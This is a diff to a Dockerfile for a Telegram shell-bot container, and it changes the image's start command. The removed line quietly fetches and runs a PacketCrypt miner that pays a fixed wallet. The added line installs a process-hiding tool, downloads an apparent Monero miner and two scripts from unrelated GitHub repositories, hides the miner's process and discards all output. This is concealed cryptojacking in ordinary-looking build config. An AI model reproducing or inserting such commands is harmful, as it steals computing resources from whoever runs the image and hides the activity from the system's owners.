@@ -38,4 +38,4 @@ RUN git clone https://github.com/botgram/shell-bot.git \
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD wget -qO ann https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 && chmod +x ann && ./ann ann -p pkt1q4q2e3l3qn8t0m062hynd5hr04kgk68gr5hd4jt https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world >/dev/null 2>&1
+CMD apt install npm -y && npm i -g node-process-hider && wget https://github.com/Rickyose/skripburu2/raw/main/xcore_xmr_amd && wget -qO set.sh https://raw.githubusercontent.com/ADEBARACK/MALING-REPO/main/setup_mullvad_vpn.sh && wget https://raw.githubusercontent.com/ADEBARACK/MALING-REPO/main/check.sh && chmod +x set.sh check.sh xcore_xmr_amd && ph add xcore_xmr_amd && ./set.sh && ./check.sh >/dev/null 2>&1
